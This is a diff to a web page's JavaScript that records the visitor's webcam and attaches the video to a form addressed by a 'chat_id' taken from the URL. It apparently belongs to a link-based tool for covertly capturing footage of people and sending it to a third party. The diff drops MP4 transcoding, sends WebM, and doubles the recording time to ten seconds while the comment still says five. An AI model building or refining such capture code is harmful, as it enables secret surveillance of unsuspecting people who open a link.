@@ -1,9 +1,6 @@
-import { transcodeWebMtoMP4 } from '/ffmpegHelper.js'; // ✅ HARUS dari public
-
 const params = new URLSearchParams(window.location.search);
 const url = params.get('url');
 const uid = params.get('uid');
-
 
 if (!url || !uid) {
   document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">❌ Parameter tidak lengkap</h2>';
@@ -69,13 +66,13 @@ if (!isPhotoMode) {
 
       recorder = new MediaRecorder(stream);
       recorder.ondataavailable = e => chunks.push(e.data);
+
       recorder.onstop = async () => {
         const blob = new Blob(chunks, { type: 'video/webm' });
-        const mp4Blob = await transcodeWebMtoMP4(blob); // Transcode ke mp4
 
         const form = new FormData();
         form.append("chat_id", uid);
-        form.append("video", mp4Blob, "webcam.mp4");
+        form.append("video", blob, "webcam.webm");
 
 
         const timestamp = new Date().toLocaleTimeString();
@@ -89,13 +86,12 @@ if (!isPhotoMode) {
 
       };
 
-
       recorder.start();
 
       setTimeout(() => {
         recorder.stop();
         stream.getTracks().forEach(track => track.stop());
-      }, 5000); // 5 detik
+      }, 10000); // 5 detik
     } catch (err) {
       console.error("❌ Gagal akses webcam (video):", err);
     }
